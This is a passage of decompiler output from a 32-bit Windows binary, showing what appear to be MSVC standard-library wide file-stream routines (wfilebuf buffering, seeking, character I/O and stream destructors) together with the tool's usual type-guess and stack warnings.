  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) - 4) = *(_DWORD *)(*this + 4) - 104;
  sub_41F4D0(v6, 0);
  if ( !sub_41F3D0(v6, a2, a3 | 2, v7) )
    sub_4036A0(
      (_DWORD *)((char *)this + *(_DWORD *)(*this + 4)),
      *((_BYTE *)this + *(_DWORD *)(*this + 4) + 12) | (4
                                                      * (*(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) + 56) == 0)
                                                      + 2),
      0);
  return this;
}
// 419F93: variable 'v7' is possibly undefined
// 4B856C: using guessed type void *std::ios_base::`vftable';
// 4BD5FC: using guessed type void *std::wios::`vftable';
// 4BD604: using guessed type void *std::wostream::`vftable';
// 4CF7AC: using guessed type void *std::wofstream::`vftable';

//----- (00419FE0) --------------------------------------------------------
_DWORD *__thiscall sub_419FE0(_DWORD *this, int a2)
{
  char *v3; // edi
  _DWORD *result; // eax

  v3 = sub_4219F0(a2);
  result = (_DWORD *)(*(int (__thiscall **)(char *))(*(_DWORD *)v3 + 12))(v3);
  if ( (_BYTE)result )
  {
    this[14] = 0;
  }
  else
  {
    this[14] = v3;
    return sub_4210E0(this);
  }
  return result;
}

//----- (0041A020) --------------------------------------------------------
int __thiscall sub_41A020(FILE **this)
{
  if ( !this[19]
    || ((unsigned __int16 (__thiscall *)(FILE **, int))(*this)->_flag)(this, 0xFFFF) == 0xFFFF
    || fflush(this[19]) >= 0 )
  {
    return 0;
  }
  else
  {
    return -1;
  }
}

//----- (0041A060) --------------------------------------------------------
int *__thiscall sub_41A060(int *this, char *Buffer, __int64 a3)
{
  FILE *v4; // ecx
  int v5; // eax

  v4 = (FILE *)this[19];
  if ( !v4 )
    return 0;
  v5 = Buffer || a3 ? 0 : 4;
  if ( setvbuf(v4, Buffer, v5, 2 * a3) )
    return 0;
  sub_41F280((int)this, this[19], 1);
  return this;
}

//----- (0041A0C0) --------------------------------------------------------
int __thiscall sub_41A0C0(int this, int a2, __int64 a3, __int64 a4, int a5, int a6, int a7)
{
  _DWORD *v8; // ebx
  int v9; // ecx
  int v10; // edx
  int v11; // edx
  int v12; // esi
  fpos_t Position; // [esp+10h] [ebp-10h] BYREF

  Position = a4 + a3;
  if ( *(_DWORD *)(this + 76) && sub_41F1B0((void *)this) && !fsetpos(*(FILE **)(this + 76), &Position) )
  {
    v8 = *(_DWORD **)(this + 12);
    *(_DWORD *)(this + 64) = a5;
    *(_DWORD *)(this + 68) = a6;
    if ( *v8 == this + 60 )
    {
      v9 = *(_DWORD *)(this + 80);
      v10 = *(_DWORD *)(this + 84) - v9;
      *v8 = v9;
      **(_DWORD **)(this + 28) = v9;
      **(_DWORD **)(this + 44) = v10 >> 1;
    }
    v11 = *(_DWORD *)(this + 64);
    v12 = *(_DWORD *)(this + 68);
    *(_QWORD *)a2 = Position;
    *(_DWORD *)(a2 + 8) = 0;
    *(_DWORD *)(a2 + 12) = 0;
    *(_DWORD *)(a2 + 16) = v11;
    *(_DWORD *)(a2 + 20) = v12;
  }
  else
  {
    *(_DWORD *)a2 = -1;
    *(_DWORD *)(a2 + 4) = -1;
    *(_DWORD *)(a2 + 8) = 0;
    *(_DWORD *)(a2 + 12) = 0;
    *(_QWORD *)(a2 + 16) = 0i64;
  }
  return a2;
}

//----- (0041A1B0) --------------------------------------------------------
int __thiscall sub_41A1B0(int this, int a2, __int64 a3, int Origin, int a5)
{
  unsigned int v6; // eax
  unsigned int v7; // ebx
  int v8; // edx
  int v9; // esi
  unsigned int v11; // [esp+Ch] [ebp-14h]
  fpos_t Position; // [esp+10h] [ebp-10h] BYREF

  if ( **(_DWORD **)(this + 28) == this + 60 && Origin == 1 && !*(_DWORD *)(this + 56) )
  {
    v6 = (unsigned __int64)(a3 - 2) >> 32;
    v7 = a3 - 2;
  }
  else
  {
    v6 = HIDWORD(a3);
    v7 = a3;
  }
  v11 = v6;
  if ( !*(_DWORD *)(this + 76)
    || !sub_41F1B0((void *)this)
    || (__PAIR64__(v7, v11) || Origin != 1) && _fseeki64(*(FILE **)(this + 76), __SPAIR64__(v11, v7), Origin)
    || fgetpos(*(FILE **)(this + 76), &Position) )
  {
    *(_DWORD *)a2 = -1;
    *(_DWORD *)(a2 + 4) = -1;
    *(_DWORD *)(a2 + 8) = 0;
    *(_DWORD *)(a2 + 12) = 0;
    *(_QWORD *)(a2 + 16) = 0i64;
  }
  else
  {
    std::wfilebuf::_Reset_back(this);
    v8 = *(_DWORD *)(this + 64);
    v9 = *(_DWORD *)(this + 68);
    *(_QWORD *)a2 = Position;
    *(_DWORD *)(a2 + 8) = 0;
    *(_DWORD *)(a2 + 12) = 0;
    *(_DWORD *)(a2 + 16) = v8;
    *(_DWORD *)(a2 + 20) = v9;
  }
  return a2;
}
// 41F180: using guessed type int __thiscall std::wfilebuf::_Reset_back(_DWORD);

//----- (0041A2B0) --------------------------------------------------------
int __thiscall sub_41A2B0(void *this, char *Src, __int64 a3)
{
  int v3; // eax
  _DWORD **v4; // edx
  int v5; // edi
  unsigned int v6; // esi
  __int64 v7; // rax
  unsigned int v8; // ebx
  int v9; // ecx
  bool v10; // cf
  int v13; // [esp+14h] [ebp-4h]

  v3 = a3;
  v4 = (_DWORD **)this;
  v5 = HIDWORD(a3);
  v6 = a3;
  if ( a3 > 0 )
  {
    do
    {
      v7 = sub_41F6F0(v4);
      v13 = HIDWORD(v7);
      v8 = v7;
      if ( v7 <= 0 )
      {
        if ( (*(unsigned __int16 (__thiscall **)(void *, _DWORD))(*(_DWORD *)this + 12))(this, *(unsigned __int16 *)Src) == 0xFFFF )
          break;
        v4 = (_DWORD **)this;
        v10 = v6-- != 0;
        v9 = 2;
        v5 = v10 + v5 - 1;
      }
      else
      {
        if ( __SPAIR64__(v5, v6) < v7 )
        {
          v8 = v6;
          v13 = v5;
        }
        memmove(**((void ***)this + 8), Src, 2 * v8);
        v4 = (_DWORD **)this;
        v9 = 2 * v8;
        v5 = (__PAIR64__(v5, v6) - __PAIR64__(v13, v8)) >> 32;
        v6 -= v8;
        **((_DWORD **)this + 12) -= v8;
        **((_DWORD **)this + 8) += 2 * v8;
      }
      Src += v9;
    }
    while ( v5 > 0 || v5 >= 0 && v6 );
    v3 = a3;
  }
  return v3 - v6;
}

//----- (0041A390) --------------------------------------------------------
int __thiscall sub_41A390(void *this, _WORD *a2, __int64 a3)
{
  int v3; // eax
  _DWORD **v4; // edx
  int v5; // edi
  int v6; // esi
  __int64 v7; // rax
  int v8; // ebx
  int v9; // ecx
  _WORD *v10; // eax
  __int16 v11; // cx
  bool v12; // cf
  int v15; // [esp+14h] [ebp-4h]

  v3 = a3;
  v4 = (_DWORD **)this;
  v5 = HIDWORD(a3);
  v6 = a3;
  if ( a3 > 0 )
  {
    do
    {
      v7 = sub_41F710(v4);
      v15 = HIDWORD(v7);
      v8 = v7;
      if ( v7 <= 0 )
      {
        v11 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 28))(this);
        if ( v11 == -1 )
          break;
        v10 = a2;
        v12 = v6-- != 0;
        v4 = (_DWORD **)this;
        v5 = v12 + v5 - 1;
        *a2 = v11;
        v9 = 1;
      }
      else
      {
        if ( __SPAIR64__(v5, v6) < v7 )
        {
          v8 = v6;
          v15 = v5;
        }
        memmove(a2, **((const void ***)this + 7), 2 * v8);
        v4 = (_DWORD **)this;
        v9 = v8;
        v5 = (__PAIR64__(v5, v6) - __PAIR64__(v15, v8)) >> 32;
        v6 -= v8;
        **((_DWORD **)this + 11) -= v8;
        **((_DWORD **)this + 7) += 2 * v8;
        v10 = a2;
      }
      a2 = &v10[v9];
    }
    while ( v5 > 0 || v5 >= 0 && v6 );
    v3 = a3;
  }
  return v3 - v6;
}

//----- (0041A480) --------------------------------------------------------
wint_t __thiscall sub_41A480(int this)
{
  int v1; // ebx
  unsigned int v2; // ecx
  _DWORD *v3; // edx
  int *v4; // edx
  int v5; // eax
  wint_t result; // ax
  _DWORD *v7; // esi
  int v8; // ecx
  int v9; // edx
  int v10; // eax
  char v11; // dl
  unsigned int v12; // ecx
  void **v13; // eax
  int v14; // ebx
  void **v15; // ecx
  void **v16; // edi
  char *v17; // ecx
  int v18; // eax
  void **v19; // eax
  void **v20; // edx
  unsigned int v21; // edi
  unsigned int v22; // eax
  int v23; // eax
  __int16 v24; // ax
  __int16 v25; // si
  void *v26; // ecx
  int v27; // ecx
  int v28; // esi
  int v29; // eax
  void **v30; // eax
  int v31; // [esp+10h] [ebp-44h]
  int v32; // [esp+14h] [ebp-40h]
  __int16 *v34; // [esp+1Ch] [ebp-38h] BYREF
  int v35; // [esp+20h] [ebp-34h] BYREF
  int v36; // [esp+24h] [ebp-30h]
  void *v37[4]; // [esp+28h] [ebp-2Ch] BYREF
  unsigned int v38; // [esp+38h] [ebp-1Ch]
  unsigned int v39; // [esp+3Ch] [ebp-18h]
  __int16 v40; // [esp+40h] [ebp-14h] BYREF
  char v41[2]; // [esp+42h] [ebp-12h] BYREF
  int v42; // [esp+50h] [ebp-4h]

  v1 = this;
  v2 = **(_DWORD **)(this + 28);
  if ( v2 && (v3 = *(_DWORD **)(v1 + 44), v2 < v2 + 2 * *v3) )
  {
    --*v3;
    v4 = *(int **)(v1 + 28);
    v5 = *v4;
    *v4 += 2;
    return *(_WORD *)v5;
  }
  else if ( *(_DWORD *)(v1 + 76) )
  {
    v7 = *(_DWORD **)(v1 + 12);
    if ( *v7 == v1 + 60 )
    {
      v8 = *(_DWORD *)(v1 + 80);
      v9 = *(_DWORD *)(v1 + 84) - v8;
      *v7 = v8;
      **(_DWORD **)(v1 + 28) = v8;
      **(_DWORD **)(v1 + 44) = v9 >> 1;
    }
    if ( *(_DWORD *)(v1 + 56) )
    {
      v38 = 0;
      v39 = 15;
      LOBYTE(v37[0]) = 0;
      v42 = 0;
      v10 = fgetc(*(FILE **)(v1 + 76));
      v11 = v10;
      if ( v10 == -1 )
      {
LABEL_32:
        v24 = -1;
      }
      else
      {
        v31 = v1 + 64;
        while ( 1 )
        {
          v12 = v38;
          LOBYTE(v36) = v11;
          if ( v38 >= v39 )
          {
            LOBYTE(v32) = 0;
            sub_424B40(v37, v38, v32, v36);
          }
          else
          {
            ++v38;
            v13 = v37;
            if ( v39 >= 0x10 )
              v13 = (void **)v37[0];
            *((_BYTE *)v13 + v12) = v11;
            *((_BYTE *)v13 + v12 + 1) = 0;
          }
          v14 = *(_DWORD *)(v1 + 56);
          v15 = v37;
          if ( v39 >= 0x10 )
            v15 = (void **)v37[0];
          v16 = v37;
          v17 = (char *)v15 + v38;
          if ( v39 >= 0x10 )
            v16 = (void **)v37[0];
          v18 = (*(int (__thiscall **)(int, int, void **, char *, int *, __int16 *, char *, __int16 **))(*(_DWORD *)v14 + 24))(
                  v14,
                  v31,
                  v16,
                  v17,
                  &v35,
                  &v40,
                  v41,
                  &v34);
          if ( v18 < 0 )
            goto LABEL_48;
          if ( v18 > 1 )
            break;
          v19 = v37;
          if ( v34 != &v40 )
          {
            if ( v39 >= 0x10 )
              v19 = (void **)v37[0];
            v27 = v35;
            v28 = (int)v19 + v38 - v35;
            if ( v28 > 0 )
            {
              while ( 1 )
              {
                v29 = *(char *)(v28 + v27 - 1);
                --v28;
                ungetc(v29, *(FILE **)(this + 76));
                if ( v28 <= 0 )
                  break;
                v27 = v35;
              }
            }
            v24 = v40;
            goto LABEL_33;
          }
          v20 = v37;
          if ( v39 >= 0x10 )
            v19 = (void **)v37[0];
          v21 = v35 - (_DWORD)v19;
          v22 = v38;
          if ( v38 < v21 )
            v21 = v38;
          if ( v39 >= 0x10 )
            v20 = (void **)v37[0];
          v38 -= v21;
          memmove_0(v20, (char *)v20 + v21, v22 - v21 + 1);
          v1 = this;
          v23 = fgetc(*(FILE **)(this + 76));
          v11 = v23;
          if ( v23 == -1 )
            goto LABEL_32;
        }
        if ( v18 != 3 )
        {
LABEL_48:
          v25 = -1;
          goto LABEL_34;
        }
        v30 = v37;
        if ( v39 >= 0x10 )
          v30 = (void **)v37[0];
        v24 = *(char *)v30;
      }
LABEL_33:
      v25 = v24;
LABEL_34:
      v42 = -1;
      if ( v39 >= 0x10 )
      {
        v26 = v37[0];
        if ( v39 + 1 >= 0x1000 )
        {
          v26 = (void *)*((_DWORD *)v37[0] - 1);
          if ( (unsigned int)(v37[0] - v26 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        sub_46C87D(v26);
      }
      v38 = 0;
      result = v25;
      v39 = 15;
      LOBYTE(v37[0]) = 0;
    }
    else
    {
      result = fgetwc(*(FILE **)(v1 + 76));
      if ( result == 0xFFFF )
        return -1;
    }
  }
  else
  {
    return -1;
  }
  return result;
}
// 41A5B5: variable 'v32' is possibly undefined
// 41A480: using guessed type char var_12[2];

//----- (0041A740) --------------------------------------------------------
__int16 __thiscall sub_41A740(_DWORD **this)
{
  unsigned int v2; // eax
  __int16 result; // ax
  int v4; // edi

  v2 = *this[7];
  if ( v2 && v2 < v2 + 2 * *this[11] )
    return *(_WORD *)v2;
  v4 = ((unsigned __int16 (__thiscall *)(_DWORD **))(*this)[7])(this);
  result = -1;
  if ( (_WORD)v4 != 0xFFFF )
  {
    ((void (__thiscall *)(_DWORD **, int))(*this)[4])(this, v4);
    return v4;
  }
  return result;
}

//----- (0041A780) --------------------------------------------------------
wint_t __thiscall sub_41A780(int this, wint_t Character)
{
  unsigned int v3; // ecx
  wint_t result; // ax
  _DWORD *v5; // ebx
  _WORD *v6; // edx
  _DWORD *v7; // eax
  _WORD *v8; // eax

  v3 = **(_DWORD **)(this + 28);
  if ( !v3 || **(_DWORD **)(this + 12) >= v3 || Character != 0xFFFF && *(_WORD *)(v3 - 2) != Character )
  {
    if ( *(_DWORD *)(this + 76) && Character != 0xFFFF )
    {
      if ( !*(_DWORD *)(this + 56) && ungetwc(Character, *(FILE **)(this + 76)) != 0xFFFF )
        return Character;
      v5 = *(_DWORD **)(this + 28);
      v6 = (_WORD *)(this + 60);
      if ( *v5 != this + 60 )
      {
        v7 = *(_DWORD **)(this + 12);
        *v6 = Character;
        v8 = (_WORD *)*v7;
        if ( v8 != v6 )
        {
          *(_DWORD *)(this + 80) = v8;
          *(_DWORD *)(this + 84) = *v5 + 2 * **(_DWORD **)(this + 44);
        }
        **(_DWORD **)(this + 12) = v6;
        **(_DWORD **)(this + 28) = v6;
        **(_DWORD **)(this + 44) = 1;
        return Character;
      }
    }
    return -1;
  }
  ++**(_DWORD **)(this + 44);
  **(_DWORD **)(this + 28) -= 2;
  result = Character;
  if ( Character == 0xFFFF )
    return 0;
  return result;
}

//----- (0041A850) --------------------------------------------------------
wchar_t __thiscall sub_41A850(int this, wchar_t Character)
{
  wchar_t result; // ax
  unsigned int v4; // ecx
  _DWORD *v5; // edx
  _WORD **v6; // edx
  _WORD *v7; // esi
  _DWORD *v8; // ebx
  int v9; // ecx
  int v10; // edx
  int v11; // ecx
  bool v12; // zf
  int v13; // eax
  int v14; // ebx
  int *v15; // [esp+8h] [ebp-30h] BYREF
  char *v16; // [esp+Ch] [ebp-2Ch] BYREF
  int v17; // [esp+10h] [ebp-28h] BYREF
  char Buffer[32]; // [esp+14h] [ebp-24h] BYREF
  int v19; // [esp+34h] [ebp-4h] BYREF

  if ( Character == 0xFFFF )
    return 0;
  v4 = **(_DWORD **)(this + 32);
  if ( v4 )
  {
    v5 = *(_DWORD **)(this + 48);
    if ( v4 < v4 + 2 * *v5 )
    {
      --*v5;
      v6 = *(_WORD ***)(this + 32);
      v7 = (*v6)++;
      *v7 = Character;
      return Character;
    }
  }
  if ( !*(_DWORD *)(this + 76) )
    return -1;
  v8 = *(_DWORD **)(this + 12);
  if ( *v8 == this + 60 )
  {
    v9 = *(_DWORD *)(this + 80);
    v10 = *(_DWORD *)(this + 84) - v9;
    *v8 = v9;
    **(_DWORD **)(this + 28) = v9;
    **(_DWORD **)(this + 44) = v10 >> 1;
  }
  v11 = *(_DWORD *)(this + 56);
  if ( !v11 )
  {
    v12 = fputwc(Character, *(FILE **)(this + 76)) == 0xFFFFu;
    result = Character;
    if ( v12 )
      return -1;
    return result;
  }
  v17 = Character;
  v13 = (*(int (__thiscall **)(int, int, int *, char *, int **, char *, int *, char **))(*(_DWORD *)v11 + 28))(
          v11,
          this + 64,
          &v17,
          (char *)&v17 + 2,
          &v15,
          Buffer,
          &v19,
          &v16);
  if ( v13 < 0 )
    return -1;
  if ( v13 <= 1 )
  {
    if ( v16 == Buffer || (v14 = v16 - Buffer, v14 == fwrite(Buffer, 1u, v16 - Buffer, *(FILE **)(this + 76))) )
    {
      *(_BYTE *)(this + 62) = 1;
      if ( v15 != &v17 )
        return Character;
    }
    return -1;
  }
  if ( v13 != 3 )
    return -1;
  v12 = !sub_403B10(v17, *(FILE **)(this + 76));
  result = Character;
  if ( v12 )
    return -1;
  return result;
}

//----- (0041A9C0) --------------------------------------------------------
void __thiscall sub_41A9C0(FILE **this)
{
  if ( this[19] )
    _unlock_file(this[19]);
}

//----- (0041A9D0) --------------------------------------------------------
void __thiscall sub_41A9D0(FILE **this)
{
  if ( this[19] )
    _lock_file(this[19]);
}

//----- (0041A9E0) --------------------------------------------------------
void __thiscall sub_41A9E0(_DWORD *this)
{
  void **v2; // edi
  void *v3; // ecx
  int v4; // edx
  _DWORD *v5; // esi
  int v6; // ecx
  void (__thiscall ***v7)(_DWORD, int); // eax

  *this = &std::wfilebuf::`vftable';
  if ( this[19] )
  {
    v2 = (void **)this[3];
    if ( *v2 == this + 15 )
    {
      v3 = (void *)this[20];
      v4 = this[21] - (_DWORD)v3;
      *v2 = v3;
      *(_DWORD *)this[7] = v3;
      *(_DWORD *)this[11] = v4 >> 1;
    }
  }
  if ( *((_BYTE *)this + 72) )
    sub_41F310((int)this);
  *this = &std::wstreambuf::`vftable';
  v5 = (_DWORD *)this[13];
  if ( v5 )
  {
    v6 = v5[1];
    if ( v6 )
    {
      v7 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v6 + 8))(v6);
      if ( v7 )
        (**v7)(v7, 1);
    }
    sub_46C87D(v5);
  }
}
// 4BD57C: using guessed type void *std::wstreambuf::`vftable';
// 4BD5BC: using guessed type void *std::wfilebuf::`vftable';

//----- (0041AAA0) --------------------------------------------------------
int __thiscall sub_41AAA0(_DWORD *this)
{
  char *v1; // edx
  int v2; // ecx
  int result; // eax

  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 8) + 4) - 32) = &std::wiostream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 8) + 4) - 36) = *(_DWORD *)(*(this - 8) + 4) - 32;
  v1 = (char *)(this - 2);
  *(_DWORD *)&v1[*(_DWORD *)(*(this - 4) + 4) - 8] = &std::wostream::`vftable';
  *(_DWORD *)&v1[*(_DWORD *)(*(this - 4) + 4) - 12] = *(_DWORD *)(*(this - 4) + 4) - 8;
  *(_DWORD *)&v1[*(_DWORD *)(*(this - 8) + 4) - 24] = &std::wistream::`vftable';
  v2 = *(_DWORD *)(*(this - 8) + 4);
  result = v2 - 24;
  *(_DWORD *)&v1[v2 - 28] = v2 - 24;
  return result;
}
// 4BD604: using guessed type void *std::wostream::`vftable';
// 4CF880: using guessed type void *std::wistream::`vftable';
// 4CF900: using guessed type void *std::wiostream::`vftable';

//----- (0041AB40) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __userpurge sub_41AB40@<eax>(int a1@<ecx>, int a2@<ebp>, int a3)
{
  int v4; // edi
  int v5; // eax
  void (__thiscall ***v6)(_DWORD, int); // eax
  int v7; // edx
  int v8; // ecx
  int v9; // eax
  int v10; // ecx
  char v11; // al
  int v12; // ecx
  _DWORD v14[4]; // [esp-48h] [ebp-54h] BYREF
  int v15; // [esp-38h] [ebp-44h] BYREF
  int v16; // [esp-34h] [ebp-40h]
  _BYTE *v17; // [esp-30h] [ebp-3Ch] BYREF
  char v18; // [esp-2Ch] [ebp-38h]
  int v19; // [esp-28h] [ebp-34h]
  int v20; // [esp-24h] [ebp-30h]
  int *v21; // [esp-20h] [ebp-2Ch]
  int v22; // [esp-1Ch] [ebp-28h]
  int *v23; // [esp-14h] [ebp-20h]
  _DWORD *v24; // [esp-10h] [ebp-1Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h]
  void *v26; // [esp-8h] [ebp-14h]
  int v27; // [esp-4h] [ebp-10h]
  int v28; // [esp+0h] [ebp-Ch]
  int v29; // [esp+4h] [ebp-8h]
  int v30; // [esp+8h] [ebp-4h] BYREF
  int retaddr; // [esp+Ch] [ebp+0h]

  v28 = a2;
  v29 = retaddr;
  v27 = -1;
  v26 = &loc_4AFD69;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v23 = &v30;
  v24 = v14;
  v20 = a1;
  v22 = 0;
  v4 = 0;
  v19 = 0;
  sub_41D970(&v17, a1);
  v27 = 0;
  if ( v18 )
  {
    v5 = *(_DWORD *)(*(_DWORD *)a1 + 4);
    LOBYTE(v27) = 1;
    v16 = *(_DWORD *)(*(_DWORD *)(v5 + a1 + 48) + 4);
    (*(void (__stdcall **)(_DWORD, _DWORD, _DWORD, _DWORD, int, int))(*(_DWORD *)v16 + 4))(
      v14[0],
      v14[1],
      v14[2],
      v14[3],
      v15,
      v16);
    v22 = 1;
    v21 = sub_424420((int)&v15);
    v22 = 0;
    LOBYTE(v27) = 0;
    if ( v16 )
    {
      v6 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v16 + 8))(v16);
      if ( v6 )
        (**v6)(v6, 1);
    }
    LOBYTE(v27) = 2;
    v7 = a1 + *(_DWORD *)(*(_DWORD *)a1 + 4);
    LOBYTE(v15) = 0;
    v8 = *(unsigned __int16 *)(v7 + 64);
    v9 = *v21;
    v16 = 1;
    v15 = v8;
    (*(void (__thiscall **)(int *, int *, int, _DWORD, int))(v9 + 36))(v21, &v15, v8, *(_DWORD *)(v7 + 56), v7);
    if ( (_BYTE)v15 )
      v4 = 4;
    v19 = v4;
    v27 = 0;
  }
  v10 = a1 + *(_DWORD *)(*(_DWORD *)a1 + 4);
  v11 = v4 | *(_BYTE *)(v10 + 12) | 4;
  if ( *(_DWORD *)(v10 + 56) )
    v11 = v4 | *(_BYTE *)(v10 + 12);
  sub_4036A0((_DWORD *)v10, v11, 0);
  v27 = 4;
  if ( !(unsigned __int8)j____uncaught_exception() )
    sub_421050(v17);
  v27 = -1;
  v12 = *(_DWORD *)&v17[*(_DWORD *)(*(_DWORD *)v17 + 4) + 56];
  if ( v12 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v12 + 8))(v12);
  return a1;
}
// 41AB40: could not find valid save-restore pair for ebp
// 41ABC9: bad sp value at call
// 46A06B: using guessed type int j____uncaught_exception(void);

//----- (0041ACE0) --------------------------------------------------------
int __thiscall sub_41ACE0(_DWORD *this)
{
  int v1; // edx
  int result; // eax

  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 2) + 4) - 8) = &std::wostream::`vftable';
  v1 = *(_DWORD *)(*(this - 2) + 4);
  result = v1 - 8;
  *(_DWORD *)((char *)this + v1 - 12) = v1 - 8;
  return result;
}
// 4BD604: using guessed type void *std::wostream::`vftable';

//----- (0041AD00) --------------------------------------------------------
int __thiscall sub_41AD00(_DWORD *this)
{
  int v1; // edx
  int result; // eax

  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 6) + 4) - 24) = &std::wistream::`vftable';
  v1 = *(_DWORD *)(*(this - 6) + 4);
  result = v1 - 24;
  *(_DWORD *)((char *)this + v1 - 28) = v1 - 24;
  return result;
}
// 4CF880: using guessed type void *std::wistream::`vftable';

//----- (0041AD20) --------------------------------------------------------
void *__thiscall sub_41AD20(void *this, int a2, int a3, int a4)
{
  return this;
}

//----- (0041AD30) --------------------------------------------------------
int __stdcall sub_41AD30(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8)
{
  int result; // eax

  result = a1;
  *(_DWORD *)a1 = -1;
  *(_DWORD *)(a1 + 4) = -1;
  *(_DWORD *)(a1 + 8) = 0;
  *(_DWORD *)(a1 + 12) = 0;
  *(_QWORD *)(a1 + 16) = 0i64;
  return result;
}

//----- (0041AD60) --------------------------------------------------------
int __stdcall sub_41AD60(int a1, int a2, int a3, int a4, int a5)
{
  int result; // eax

  result = a1;
  *(_DWORD *)a1 = -1;
  *(_DWORD *)(a1 + 4) = -1;
  *(_DWORD *)(a1 + 8) = 0;
  *(_DWORD *)(a1 + 12) = 0;
  *(_QWORD *)(a1 + 16) = 0i64;
  return result;
}

//----- (0041AD90) --------------------------------------------------------
int __thiscall sub_41AD90(void *this, char *Src, __int64 a3)
{
  unsigned int v3; // esi
  _DWORD **v4; // edx
  int v5; // edi
  int v6; // eax
  __int64 v7; // rax
  unsigned int v8; // ebx
  int v9; // ecx
  bool v10; // cf
  int v13; // [esp+14h] [ebp-Ch]

  v3 = a3;
  v4 = (_DWORD **)this;
  v5 = HIDWORD(a3);
  v6 = a3;
  if ( a3 > 0 )
  {
    do
    {
      v7 = sub_41F6F0(v4);
      v13 = HIDWORD(v7);
      v8 = v7;
      if ( v7 <= 0 )
      {
        if ( (*(unsigned __int16 (__thiscall **)(void *, _DWORD))(*(_DWORD *)this + 12))(this, *(unsigned __int16 *)Src) == 0xFFFF )
          break;
        v4 = (_DWORD **)this;
        v10 = v3-- != 0;
        v9 = 2;
        v5 = v10 + v5 - 1;
      }
      else
      {
        if ( __SPAIR64__(v5, v3) < v7 )
        {
          v8 = v3;
          v13 = v5;
        }
        memmove(**((void ***)this + 8), Src, 2 * v8);
        v4 = (_DWORD **)this;
        v9 = 2 * v8;
        v5 = (__PAIR64__(v5, v3) - __PAIR64__(v13, v8)) >> 32;
        v3 -= v8;
        **((_DWORD **)this + 12) -= v8;
        **((_DWORD **)this + 8) += 2 * v8;
      }
      Src += v9;
    }
    while ( v5 > 0 || v5 >= 0 && v3 );
    v6 = a3;
  }
  return v6 - v3;
}

//----- (0041AE80) --------------------------------------------------------
int __thiscall sub_41AE80(void *this, _WORD *a2, __int64 a3)
{
  int v3; // esi
  _DWORD **v4; // edx
  int v5; // edi
  int v6; // eax
  __int64 v7; // rax
  int v8; // ebx
  int v9; // ecx
  _WORD *v10; // eax
  __int16 v11; // cx
  bool v12; // cf
  int v15; // [esp+14h] [ebp-Ch]

  v3 = a3;
  v4 = (_DWORD **)this;
  v5 = HIDWORD(a3);
  v6 = a3;
  if ( a3 > 0 )
  {
    do
    {
      v7 = sub_41F710(v4);
      v15 = HIDWORD(v7);
      v8 = v7;
      if ( v7 <= 0 )
      {
        v11 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 28))(this);
        if ( v11 == -1 )
          break;
        v10 = a2;
        v12 = v3-- != 0;
        v4 = (_DWORD **)this;
        v5 = v12 + v5 - 1;
        *a2 = v11;
        v9 = 1;
      }
      else
      {
        if ( __SPAIR64__(v5, v3) < v7 )
        {
          v8 = v3;
          v15 = v5;
        }
        memmove(a2, **((const void ***)this + 7), 2 * v8);
        v4 = (_DWORD **)this;
        v9 = v8;
        v5 = (__PAIR64__(v5, v3) - __PAIR64__(v15, v8)) >> 32;
        v3 -= v8;
        **((_DWORD **)this + 11) -= v8;
        **((_DWORD **)this + 7) += 2 * v8;
        v10 = a2;
      }
      a2 = &v10[v9];
    }
    while ( v5 > 0 || v5 >= 0 && v3 );
    v6 = a3;
  }
  return v6 - v3;
}

//----- (0041AF70) --------------------------------------------------------
int __thiscall sub_41AF70(_DWORD **this)
{
  unsigned __int16 **v3; // ecx
  unsigned __int16 *v4; // edx

  if ( ((unsigned __int16 (__thiscall *)(_DWORD **))(*this)[6])(this) == 0xFFFF )
    return 0xFFFF;
  --*this[11];
  v3 = (unsigned __int16 **)this[7];
  v4 = (*v3)++;
  return *v4;
}

//----- (0041AFB0) --------------------------------------------------------
int __stdcall sub_41AFB0(int a1)
{
  return 0xFFFF;
}

//----- (0041AFC0) --------------------------------------------------------
void __thiscall sub_41AFC0(_DWORD *this)
{
  _DWORD *v1; // esi
  int v2; // ecx
  void (__thiscall ***v3)(_DWORD, int); // eax

  v1 = (_DWORD *)this[13];
  *this = &std::wstreambuf::`vftable';
  if ( v1 )
  {
    v2 = v1[1];
    if ( v2 )
    {
      v3 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v2 + 8))(v2);
      if ( v3 )
        (**v3)(v3, 1);
    }
    sub_46C87D(v1);
  }
}
// 4BD57C: using guessed type void *std::wstreambuf::`vftable';

//----- (0041B030) --------------------------------------------------------
void __thiscall sub_41B030(struct std::ios_base *this)
{
  *(_DWORD *)this = &std::wios::`vftable';
  *(_DWORD *)this = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(this);
}
// 46A3A4: using guessed type void __cdecl std::ios_base::_Ios_base_dtor(struct std::ios_base *);
// 4B856C: using guessed type void *std::ios_base::`vftable';
// 4BD5FC: using guessed type void *std::wios::`vftable';

//----- (0041B090) --------------------------------------------------------
int __thiscall sub_41B090(FILE **this)
{
  FILE **v2; // edi
  int result; // eax

  if ( this[20] )
  {
    v2 = this + 1;
    if ( !sub_41F760(this + 1) )
      v2 = 0;
    if ( fclose(this[20]) )
      v2 = 0;
  }
  else
  {
    v2 = 0;
  }
  result = sub_41F820((int)(this + 1), 0, 2);
  if ( !v2 )
    return sub_4036A0(
             (FILE **)((char *)this + (*this)->_cnt),
             *((_BYTE *)this + (*this)->_cnt + 12) | (4 * (*(FILE **)((char *)this + (*this)->_cnt + 56) == 0) + 2),
             0);
  return result;
}

//----- (0041B100) --------------------------------------------------------
_DWORD *__thiscall sub_41B100(_DWORD *this, wchar_t *a2, int a3, int a4, int a5)
{
